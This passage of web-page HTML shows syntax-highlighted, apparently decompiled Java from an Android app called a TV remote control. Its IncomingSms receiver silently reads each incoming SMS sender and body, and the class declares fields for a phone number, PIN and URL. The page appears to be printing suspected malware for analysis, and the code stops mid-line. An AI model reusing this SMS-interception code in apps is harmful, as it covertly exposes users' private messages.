class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-14">14</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-16">16</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-18">18</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-20">20</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-22">22</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-24">24</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-26">26</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-28">28</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-30">30</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-32">32</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-34">34</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-36">36</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-38">38</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-40">40</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-42">42</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-44">44</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-46">46</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-48">48</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-50">50</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-51">51</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-52">52</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-53">53</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-54">54</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-55">55</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-56">56</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-57">57</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-58">58</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-59">59</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-60">60</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-61">61</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-62">62</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-63">63</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-64">64</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-65">65</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-66">66</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-67">67</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-68">68</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-69">69</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-70">70</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-71">71</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-72">72</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-73">73</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-74">74</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-75">75</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-76">76</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-77">77</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-78">78</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-79">79</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-80">80</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-81">81</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-82">82</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-83">83</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-84">84</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-85">85</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-86">86</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-87">87</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-88">88</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-89">89</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-90">90</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-91">91</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-92">92</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-93">93</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-94">94</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-95">95</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-96">96</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-97">97</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-98">98</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-99">99</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-100">100</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-101">101</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-102">102</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-103">103</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-104">104</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-105">105</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-106">106</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-107">107</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-108">108</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-109">109</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-110">110</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-111">111</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-112">112</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-113">113</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-114">114</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-115">115</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-116">116</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-117">117</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-118">118</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-119">119</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-120">120</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-121">121</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-122">122</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-123">123</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-124">124</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-125">125</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-126">126</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-127">127</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-128">128</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-129">129</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-130">130</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-131">131</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-132">132</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-133">133</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-134">134</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-135">135</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-136">136</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-137">137</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-138">138</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-139">139</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-140">140</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-141">141</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-142">142</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-143">143</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-144">144</div><div class="crayon-num" data-line="crayon-5f694b98e2cfa278432582-145">145</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cfa278432582-146">146</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-1"><span class="crayon-t">package</span><span class="crayon-h"> </span><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">lasmejoresapps</span><span class="crayon-sy">.</span><span class="crayon-v">tvremotecontrol</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-2">&nbsp;</div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-3"><span class="crayon-e">import </span><span class="crayon-v">android</span><span class="crayon-sy">.</span><span class="crayon-v">content</span><span class="crayon-sy">.</span><span class="crayon-v">BroadcastReceiver</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-4"><span class="crayon-e">import </span><span class="crayon-v">android</span><span class="crayon-sy">.</span><span class="crayon-v">content</span><span class="crayon-sy">.</span><span class="crayon-v">ContentValues</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-5"><span class="crayon-e">import </span><span class="crayon-v">android</span><span class="crayon-sy">.</span><span class="crayon-v">content</span><span class="crayon-sy">.</span><span class="crayon-v">Context</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-6"><span class="crayon-e">import </span><span class="crayon-v">android</span><span class="crayon-sy">.</span><span class="crayon-v">content</span><span class="crayon-sy">.</span><span class="crayon-v">Intent</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-7"><span class="crayon-e">import </span><span class="crayon-v">android</span><span class="crayon-sy">.</span><span class="crayon-v">net</span><span class="crayon-sy">.</span><span class="crayon-v">Uri</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-8"><span class="crayon-e">import </span><span class="crayon-v">android</span><span class="crayon-sy">.</span><span class="crayon-v">os</span><span class="crayon-sy">.</span><span class="crayon-v">Bundle</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-9"><span class="crayon-e">import </span><span class="crayon-v">android</span><span class="crayon-sy">.</span><span class="crayon-v">telephony</span><span class="crayon-sy">.</span><span class="crayon-v">SmsMessage</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-10"><span class="crayon-e">import </span><span class="crayon-v">android</span><span class="crayon-sy">.</span><span class="crayon-v">util</span><span class="crayon-sy">.</span><span class="crayon-v">Log</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-11">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-12"><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-t">class</span><span class="crayon-h"> </span><span class="crayon-e">IncomingSms</span><span class="crayon-h"> </span><span class="crayon-r">extends</span><span class="crayon-h"> </span><span class="crayon-e">BroadcastReceiver</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">private</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">TAG</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"IncomingSms"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">private</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">operator</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">private</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">paso</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">private</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">phoneNumber</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">private</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">pin</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">private</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">url</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-19">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-e">IncomingSms</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-r">super</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-23">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">private</span><span class="crayon-h"> </span><span class="crayon-t">void</span><span class="crayon-h"> </span><span class="crayon-e">changeSms</span><span class="crayon-sy">(</span><span class="crayon-e">Context </span><span class="crayon-v">context</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">Intent </span><span class="crayon-v">intent</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-e">throws</span><span class="crayon-h"> </span><span class="crayon-e">Exception</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-v">v5</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">long</span><span class="crayon-h"> </span><span class="crayon-v">v2</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">v0</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-28"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">v8</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">Log</span><span class="crayon-sy">.</span><span class="crayon-e">i</span><span class="crayon-sy">(</span><span class="crayon-s">"IncomingSms"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"begin method changeSms"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">try</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">Bundle </span><span class="crayon-v">v1</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">intent</span><span class="crayon-sy">.</span><span class="crayon-e">getExtras</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">v8</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">""</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">v0</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">""</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-34"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">v2</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-35"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-v">v1</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-t">null</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">goto</span><span class="crayon-h"> </span><span class="crayon-v">label_38</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-38">&nbsp;</div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-39"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-v">v7</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">v1</span><span class="crayon-sy">.</span><span class="crayon-e">get</span><span class="crayon-sy">(</span><span class="crayon-s">"pdus"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-40"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">SmsMessage</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-v">v6</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-v">SmsMessage</span><span class="crayon-sy">[</span><span class="crayon-v">v7</span><span class="crayon-sy">.</span><span class="crayon-v">length</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-41"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">v5</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-42"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">while</span><span class="crayon-sy">(</span><span class="crayon-t">true</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-43"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">label_14</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-44"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-v">v5</span><span class="crayon-h"> </span><span class="crayon-o">&gt;=</span><span class="crayon-h"> </span><span class="crayon-v">v6</span><span class="crayon-sy">.</span><span class="crayon-v">length</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-45"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">goto</span><span class="crayon-h"> </span><span class="crayon-v">label_16</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-46"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-47">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-48"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">v6</span><span class="crayon-sy">[</span><span class="crayon-v">v5</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">SmsMessage</span><span class="crayon-sy">.</span><span class="crayon-e">createFromPdu</span><span class="crayon-sy">(</span><span class="crayon-v">v7</span><span class="crayon-sy">[</span><span class="crayon-v">v5</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-49"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">v8</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-sy">.</span><span class="crayon-e">valueOf</span><span class="crayon-sy">(</span><span class="crayon-v">v8</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">v6</span><span class="crayon-sy">[</span><span class="crayon-v">v5</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-e">getOriginatingAddress</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cfa278432582-50"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">v0</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-sy">.</span><span class="crayon-e">valueOf</span><span class="crayon-sy">(</span><span class="crayon-v">v0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">v6</span><span class="crayon-sy">[</span><span class="crayon-v">v5</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-e">getMessageBody</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cfa278432582-51"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">v2</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">v6</span><span class="crayon-sy">[</span><span class="crayon-v">v5</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span 